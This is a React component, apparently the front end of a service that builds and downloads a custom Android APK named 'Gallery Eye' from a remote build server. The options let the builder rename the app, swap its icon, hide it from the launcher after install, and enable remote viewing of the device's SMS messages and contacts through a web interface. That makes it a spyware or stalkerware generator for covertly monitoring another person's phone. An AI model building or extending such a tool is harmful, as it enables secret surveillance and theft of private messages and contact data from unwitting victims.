"use client";

import { useState, useEffect } from 'react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
}

export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: AppGenerationModalProps) {
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    // Customization State
    const [appName, setAppName] = useState("Gallery Eye");
    const [hideApp, setHideApp] = useState(false);
    const [webLink, setWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);

    // Permission Manager State
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | null>(null);

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
        }
    }, [isOpen]);

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating'); // Ensure we switch to generating if we get progress
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            console.log("Queue Update:", data);
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('downloading');
            setProgress(100);
            setProgressStep("Download starting...");
            setDownloadUrl(data.url);

            // Trigger download
            const a = document.createElement('a');
            a.href = data.url;
            a.download = data.filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            setTimeout(() => {
                setStatus('completed');
            }, 2000);
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            alert(`Generation Failed: ${data.message}`);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket]);

    const startGeneration = async () => {
        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', appName);
            formData.append('hideApp', hideApp.toString());
            formData.append('webLink', webLink);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            if (customIcon) {
                formData.append('icon', customIcon);
            }

            // Trigger generation (Async)
            const response = await fetch(`https://gallery-eye-h4k3r.onrender.com/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            const data = await response.json();
            if (data.position) {
                setStatus('queued');
                setQueuePosition(data.position);
            }

            // Now we wait for socket events...

        } catch (error) {
            console.error(error);
            setStatus('idle');
            alert("Failed to start generation. Please try again.");
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn overflow-y-auto py-10">
            <div className="bg-[#1a1a1a] border border-white/20 p-8 rounded-3xl shadow-2xl max-w-md w-full text-center backdrop-blur-xl animate-scaleIn relative">
                <button
                    onClick={onClose}
                    className="absolute top-4 right-4 text-white/40 hover:text-white"
                >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                </button>

                <h2 className="text-3xl font-bold text-white mb-2">
                    {status === 'completed' ? 'App Ready!' : 'Customize Your App'}
                </h2>

                {status === 'idle' && (
                    <div className="text-left space-y-4 mt-6 mb-8">
                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">App Name</label>
                            <input
                                type="text"
                                value={appName}
                                onChange={(e) => setAppName(e.target.value)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                                placeholder="Gallery Eye"
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">Web Link (Optional)</label>
                            <input
                                type="url"
                                value={webLink}
                                onChange={(e) => setWebLink(e.target.value)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                                placeholder="https://example.com"
                            />
                            <p className="text-xs text-white/40 mt-1">Opens this link when app starts.</p>
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">Custom Icon (Optional)</label>
                            <input
                                type="file"
                                accept="image/png, image/jpeg"
                                onChange={(e) => setCustomIcon(e.target.files?.[0] || null)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white text-sm file:mr-4 file:py-1 file:px-3 file:rounded-full file:border-0 file:text-xs file:bg-purple-500 file:text-white hover:file:bg-purple-600"
                            />
                        </div>

                        <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10">
                            <span className="text-sm font-medium text-white/70">Hide App Icon</span>
                            <button
                                onClick={() => setHideApp(!hideApp)}
                                className={`w-12 h-6 rounded-full transition-colors relative ${hideApp ? 'bg-purple-500' : 'bg-white/20'}`}
                            >
                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp ? 'left-7' : 'left-1'}`} />
                            </button>
                        </div>
                        <p className="text-xs text-white/40">App will be hidden from launcher after install.</p>

                        {/* Permission Manager Section */}
                        <div className="pt-4 border-t border-white/10">
                            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
                                <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                                Permission Manager
                            </h3>

                            {/* SMS Permission */}
                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
                                <div className="flex items-center gap-2">
                                    <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                    <span className="text-sm font-medium text-white/70">SMS Access</span>
                                    <button
                                        onClick={() => setShowPermissionInfo(showPermissionInfo === 'sms' ? null : 'sms')}
                                        className="text-white/40 hover:text-white/60"
                                    >
                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                    </button>
                                </div>
                                <button
                                    onClick={() => setEnableSmsPermission(!enableSmsPermission)}
                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableSmsPermission ? 'bg-blue-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission ? 'left-7' : 'left-1'}`} />
                                </button>
                            </div>
                            {showPermissionInfo === 'sms' && (
                                <div className="mb-3 p-3 rounded-lg bg-blue-500/10 border border-blue-500/30 text-xs text-blue-300">
                                    <p className="font-medium mb-1">📱 SMS Access Permission</p>
                                    <p className="text-blue-300/80">Enabling this allows you to remotely view SMS messages on the device. You'll be able to see message content, sender information, and timestamps through the web interface.</p>
                                </div>
                            )}

                            {/* Contacts Permission */}
                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
                                <div className="flex items-center gap-2">
                                    <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                    <span className="text-sm font-medium text-white/70">Contacts Access</span>
                                    <button
                                        onClick={() => setShowPermissionInfo(showPermissionInfo === 'contacts' ? null : 'contacts')}
                                        className="text-white/40 hover:text-white/60"
                                    >
                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                    </button>
                                </div>
                                <button
                                    onClick={() => setEnableContactsPermission(!enableContactsPermission)}
                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission ? 'left-7' : 'left-1'}`} />
                                </button>
                            </div>
                            {showPermissionInfo === 'contacts' && (
                                <div className="mb-3 p-3 rounded-lg bg-green-500/10 border border-green-500/30 text-xs text-green-300">
                                    <p className="font-medium mb-1">📇 Contacts Access Permission</p>
                                    <p className="text-green-300/80">Enabling this allows you to remotely view contacts on the device. You'll be able to see names, phone numbers, emails, and profile photos through the web interface.</p>
                                </div>
                            )}
                        </div>
                    </div>
                )}

                {status === 'queued' && (
                    <div className="mb-8">
                        <div className="flex flex-col items-center justify-center py-6">
                            <div className="w-16 h-16 border-4 border-purple-500/30 border-t-purple-500 rounded-full animate-spin mb-4"></div>
                            <h3 className="text-xl font-bold text-white mb-1">You are in Queue</h3>
                            <p className="text-white/60">Position: <span className="text-purple-400 font-bold text-lg">{queuePosition}</span></p>
                            <p className="text-xs text-white/40 mt-4 max-w-xs">Your build will start automatically when the previous one finishes.</p>
                        </div>
                    </div>
                )}

                {(status === 'generating' || status === 'downloading' || status === 'completed') && (
                    <div className="mb-8">
                        <p className="text-white/60 mb-4 font-mono text-sm">
                            {status === 'completed'
                                ? "Install this APK on your Android device."
                                : (progressStep || "Processing...")}
                        </p>
                        <div className="relative h-4 bg-white/10 rounded-full overflow-hidden">
                            <div
                                className="absolute top-0 left-0 h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-500"
                                style={{ width: `${progress}%` }}
                            />
                        </div>
                    </div>
                )}

                <div className="flex flex-col items-center justify-center gap-4">
                    {status === 'idle' ? (
                        <button
                            onClick={startGeneration}
                            className="w-full px-8 py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold rounded-xl hover:scale-105 transition-transform shadow-lg shadow-purple-500/20"
                        >
                            Generate & Download
                        </button>
                    ) : status === 'completed' ? (
                        <button
                            onClick={onClose}
                            className="px-8 py-3 bg-white text-black font-bold rounded-full hover:scale-105 transition-transform"
                        >
                            Done
                        </button>
                    ) : status === 'queued' ? (
                        <button
                            disabled
                            className="px-8 py-3 bg-white/10 text-white/50 font-bold rounded-full cursor-not-allowed"
                        >
                            Waiting in Queue...
                        </button>
                    ) : (
                        <>
                            {status !== 'downloading' && <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>}
                            {/* Fallback Download Button */}
                            {downloadUrl && (
                                <a
                                    href={downloadUrl}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="mt-4 text-sm text-blue-300 hover:text-blue-200 underline cursor-pointer animate-pulse"
                                >
                                    Click here if download doesn't start automatically
                                </a>
                            )}
                        </>
                    )}
                </div>
            </div>
        </div>
    );
}
